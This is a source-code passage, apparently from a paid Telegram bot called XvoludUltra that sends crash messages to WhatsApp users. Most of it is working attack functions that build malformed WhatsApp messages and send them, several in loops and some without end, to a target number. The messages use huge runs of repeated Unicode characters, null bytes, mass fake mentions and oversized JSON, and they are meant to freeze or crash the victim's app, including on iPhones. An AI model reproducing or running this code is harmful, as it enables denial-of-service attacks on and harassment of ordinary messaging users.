<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ AkuSange 
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 100; i++) {
    await xCursedFC(sock, target);
    await sleep(1000)
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }
        
    await bot.editMessageCaption(`
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ AkuSange 
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK TARGET ABANG KUHHH", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});
// case bak

// ~ Function Bugs
async function xCursedFC(sock, target) {
  for (var i = 0; i < 1000; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: 1775044724,
            stickerSentTs: "1775044724091"
           }
         }
       }
    }, {
      messageId: null,
      participant: {
        jid: target
      }
    });
    await new Promise((r) => setTimeout(r, 1500));
  }
}

async function BlankByXcovz(sock, target) {
  const crashText = "XvoludUltra Attack You...ꦾ" + "ꦾ".repeat(7000);

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {},
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQP18xJzDZeJSs-dF7o0SsytlUWIAODgBkjKs53yFG1yW_l_qIhJC6PCHFs12vaIIMmPUYbSYlRASC-EBva8xHQeZQSXPAybfBqyQsyY4g?ccb=9-4&oh=01_Q5Aa4AFk7RhF4RsQvz_GPMpSgOv5lMhm4D46JieEy4C9xV8Q0Q&oe=69F9521C&_nc_sid=e6ed6c&mms3=true", 
          mimetype: "image/webp",
          fileSha256: "Bu+SBPJl6LFNrbTeb8pyG0tFFnKFApTK63imoja8zDc",
          fileEncSha256: Buffer.from("1234567890"),
          mediaKey: Buffer.from("1234567890"),
          fileLength: 999999,
  directPath: "/o1/v/t24/f2/m238/AQP18xJzDZeJSs-dF7o0SsytlUWIAODgBkjKs53yFG1yW_l_qIhJC6PCHFs12vaIIMmPUYbSYlRASC-EBva8xHQeZQSXPAybfBqyQsyY4g?ccb=9-4&oh=01_Q5Aa4AFk7RhF4RsQvz_GPMpSgOv5lMhm4D46JieEy4C9xV8Q0Q&oe=69F9521C&_nc_sid=e6ed6c",
          mediaKeyTimestamp: "0",
          isAnimated: false
        },
        extendedTextMessage: {
          text: crashText,
          contextInfo: {
            externalAdReply: {
              title: "XvoludUltra.zip",
              body: "\u0000",
              previewType: "PHOTO",
              thumbnail: Buffer.alloc(0),
              sourceUrl: "https://t.me/XcovzOfficial"
            }
          }
        }
      }
    }
  }, {})

  await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
  console.log("Dev pengen nen Succes Bug")
}

async function optCurse(sock, target) {
    await sock.relayMessage(target, {
        interactiveMessage: {
            header: {
                title: "XvoludUltra",
                hasMediaAttachment: false
            },
            body: {
                text: "Lu kenal Xcovz ga bang?ituloh developer XvoludUltra" + "꧀".repeat(9000)
            },
            nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
                buttons: [
                    { name: "single_select", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "payment_method", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "call_permission_request", buttonParamsJson: "\r" + "\r".repeat(9999), voice_call: "call_galaxy" },
                    { name: "form_message", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "wa_payment_learn_more", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "wa_payment_transaction_details", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "wa_payment_fbpin_reset", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "catalog_message", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "payment_info", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "review_order", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "send_location", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "payments_care_csat", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "view_product", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "payment_settings", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "address_message", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "automated_greeting_message_view_catalog", buttonParamsJson: "\r".repeat(9999) },
                    { name: "open_webview", buttonParamsJson: "\r".repeat(9999) },
                    { name: "message_with_link_status", buttonParamsJson: "\r".repeat(9999) },
                    { name: "payment_status", buttonParamsJson:  "\r".repeat(9999) },
                    { name: "galaxy_costum", buttonParamsJson: "\r".repeat(9999) },
                    { name: "extensions_message_v2", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "landline_call", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "mpm", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "cta_copy", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "cta_url", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "review_and_pay", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "galaxy_message", buttonParamsJson: "\r" + "\r".repeat(9999) },
                    { name: "cta_call", buttonParamsJson: "\r" + "\r".repeat(9999) }
                ]
            }
        }
    }, { participant: { jid: target } } )
}
async function modified(sock, target) {
    var msg = {
        botInvokeMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {
                        senderTimestamp: "1775300436560",
                    },
                    deviceListMetadataVersion: 2,
                    messageSecret: "qqG4AXYI3yfNDzMBt4sSNhXfVh3uudSjHnX4mwcQ/pU="
                },
                interactiveResponseMessage: {
                    body: {
                        text: "XvoludUltra Attack You",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "{ X: { status: true }}",
                        version: 3
                    },
                    contextInfo: {
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardedAiBotMessageInfo: {
                            botName: "Business Assistant",
                            botJid: "13135550002@bot"
                        },
                        statusAttributionsType: "RESHARED_FROM_POST",
                        statusAttributions: Array.from({ length: 627030 }, () => ({
                            type: "EXTERNAL_SHARE"
                        }))
                    }
                }
            }
        }
    }

    return await sock.relayMessage(target, msg, {});
}

async function VnXDelayInvisNewCta(sock, target) {
  while (true) {
    try {   
      const MsgNew = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {                     
              body: {
                text: "VnXNewNihk",
                format: "VnX.DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "cta_url",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                url: "https://mmg.whatsapp.net",
                merchantUrl: "t.me/Raffioffci4",
                version: 3
              }
            }
          }
        }
      };

      await sock.relayMessage(target, MsgNew, { 
        participant: { jid: target } 
      });
      
      console.log(`VnX Delay Hard successfully spammed to ${target}`);

      await new Promise(resolve => setTimeout(resolve, 1500));

    } catch (e) {
      console.log("❌ Error Strike:", e);
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }
}
async function VnXDelayInvisNewLagi(sock, target) {
  while (true) {
    try {   
      const MsgNew = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {                     
              body: {
                text: "VnXNewAsik",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
               name: "cta_call",
               paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
               version: 3
             }
            }
          }
        }
      };

      await sock.relayMessage(target, MsgNew, { 
        participant: { jid: target } 
      });
      
      console.log(`VnX Delay Hard successfully spammed to ${target}`);

      await new Promise(resolve => setTimeout(resolve, 1500));

    } catch (e) {
      console.log("❌ Error Strike:", e);
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }
}

async function iosinVisFC3(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
        callback_data: "thanksto",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "XvoludUltra",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 10; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function IosCrashParsing(sock, target) {
  let ditthtzy = "\u0010";
  let amanda = "𑇂𑆵𑆴𑆿𑆿".repeat(30000);
  let manda = "\u0000".repeat(500000);
  let dit = "█".repeat(300000);
  
  let message = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -999999.999999,
          degreesLongitude: 999999.999999,
          name: ditthtzy + amanda + manda,
          address: ditthtzy + amanda + manda,
          url: `https://ditthtzyrine.${"𑇂𑆵𑆴𑆿".repeat(50000)}.com`,
          contextInfo: {
            participant: target,
            mentionedJid: Array.from({ length: 8000 }, () => "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"),
            externalAdReply: {
              title: dit,
              body: manda,
              mediaType: "VIDEO"
            }
          }
        },
        nativeFlowMessage: {
          name: "galaxy_message",
          paramsJson: "{".repeat(300000) + "}".repeat(300000),
          version: 3
        }
      }
    }
  };
  
  let msg = generateWAMessageFromContent(target, message, {});
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: "target_" + Date.now(),
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target }
        }]
      }]
    }]
  });
  
  console.log("✅ SUKSES SEND BUG");
}

async function Bulldozer10GB(sock, target) {
  const mentionedJid = Array.from({ length: 2000 }, (_, i) => `628${i + 72}@s.whatsapp.net`);
  const forwardedNewsletter = {
    newsletterJid: "0@",
    newsletterName: "\u0000",
    serverMessageId: 1000,
    accessibilityText: "woyy"
  };
  const disappearingMode = {
    initiator: target,
    initiatedByMe: true,
    expiration: Date.now()
  };
  const contextInfo = {
    mentionedJid,
    isForwarded: true,
    forwardingScore: 7205,
    forwardedNewsletterMessageInfo: forwardedNewsletter,
    statusAttributionType: "RESHARED_FROM_MENTION",
    contactVcard: true,
    isSampled: true,
    dissapearingMode: disappearingMode,
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    quotedMessage: { conversation: "woyy" }
  };
  const messageContent = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: [
              {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/663843748_1708884033432851_1699515070846329230_n.enc?ccb=11-4&oh=01_Q5Aa4AFzDcFXlhLg3PDXC6aKCTixUE2096FuEqqL861dzAXVZA&oe=69F368DA&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/octet-stream",
                fileSha256: "mzxwwZho/2Qg21sbpVFrLYQ2SKz6JQy3VdrH3FweipA=",
                fileLength: "1305374",
                pageCount: 0,
                mediaKey: "G8BRTAHPUEj5SCrIZbKydb49AX1sdXzq1Iys8S0/79c=",
                fileName: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖆 𝕾𝖈𝖍𝖊𝖒𝖆🎩⁵.bin",
                fileEncSha256: "8GF7kGoYPe9OIBIQWFaoyjqCx7iJKGktovX4vgqs3xg=",
                directPath: "/v/t62.7119-24/663843748_1708884033432851_1699515070846329230_n.enc?ccb=11-4&oh=01_Q5Aa4AFzDcFXlhLg3PDXC6aKCTixUE2096FuEqqL861dzAXVZA&oe=69F368DA&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1774975775"
              },
              {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/663950535_956076154041508_7065433099421170070_n.enc?ccb=11-4&oh=01_Q5Aa4AGjHI94kEuYpv1_z0NmsAA8jM4HjEx3DQ6RA2QR7CwSJw&oe=69F360F2&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/octet-stream",
                fileSha256: "xPwGqrWEeoDmXnJLXjLdHdZW6zJT8+RgZlUzHJv0je0=",
                fileLength: "1305374",
                pageCount: 0,
                mediaKey: "r7quDRofxOvexwLGFQCPp0WxRHRFJChvQ6orO0hUvkM=",
                fileName: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖆 𝕾𝖈𝖍𝖊𝖒𝖆🎩³.bin",
                fileEncSha256: "37gj//bpFvaOBw+wFvGhoV1ojfooLecOAGBgoqEw5O8=",
                directPath: "/v/t62.7119-24/663950535_956076154041508_7065433099421170070_n.enc?ccb=11-4&oh=01_Q5Aa4AGjHI94kEuYpv1_z0NmsAA8jM4HjEx3DQ6RA2QR7CwSJw&oe=69F360F2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1774975830"
              },
              {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/606263454_947687417622910_2832583790339112896_n.enc?ccb=11-4&oh=01_Q5Aa4AFX5bDoD1glIPgusXOG719oxBS073bcd-nSmPN8PX6Naw&oe=69F36BC5&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/octet-stream",
                fileSha256: "Jtw/IlIhc4DI49xn7i0OxdmbY38IvyyeRU2ZQ9bQThI=",
                fileLength: "1305374",
                pageCount: 0,
                mediaKey: "aLSDS41KeZfEjVSs6jQjrMtm1+DYp8pcgm63p/9xT4M=",
                fileName: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖆 𝕾𝖈𝖍𝖊𝖒𝖆🎩².bin",
                fileEncSha256: "6qM2raQ6zSw5xPpTFQ+kcZKC4tP9/+KnOHZSl+vFi7c=",
                directPath: "/v/t62.7119-24/606263454_947687417622910_2832583790339112896_n.enc?ccb=11-4&oh=01_Q5Aa4AFX5bDoD1glIPgusXOG719oxBS073bcd-nSmPN8PX6Naw&oe=69F36BC5&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1774975850"
              },
              {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/614455028_1202686655065576_7598631975214445345_n.enc?ccb=11-4&oh=01_Q5Aa4AGtOX5rCouaD5mIpRRRPzRAhNvdgbJH_hQGyQs_TxDH5w&oe=69F381EA&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "IADdnQ8yEc3P2Scf6idVM82+vGPK3uBkfu6hHrLneq4=",
                fileLength: "136847",
                height: 1280,
                width: 1280,
                mediaKey: "vqpdC2TEmcJDVI6/+aWyW66cznWyETyhapPpflyrv+g=",
                fileEncSha256: "hGZ4SQhkuOazPN6JaJGJxn2PXOer99diKpdjVs9Ck84=",
